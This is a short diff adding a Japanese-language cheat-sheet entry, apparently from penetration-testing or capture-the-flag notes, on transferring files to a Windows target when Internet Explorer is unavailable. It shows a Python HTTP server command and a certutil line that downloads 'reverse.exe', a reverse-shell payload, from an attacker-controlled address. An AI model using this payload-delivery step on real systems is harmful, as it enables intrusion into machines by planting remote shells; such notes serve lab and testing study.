@@ -1,0 +1,8 @@
+1. Server から　Client へのダウンロード (IE使えないとき)
+# Server
+sudo python -m SimpleHTTPServer 80
+sudo python3 -m http.server 80
+# Client
+certutil -f -split -urlcache http://10.9.2.110:80/reverse.exe reverse.exe
+
+
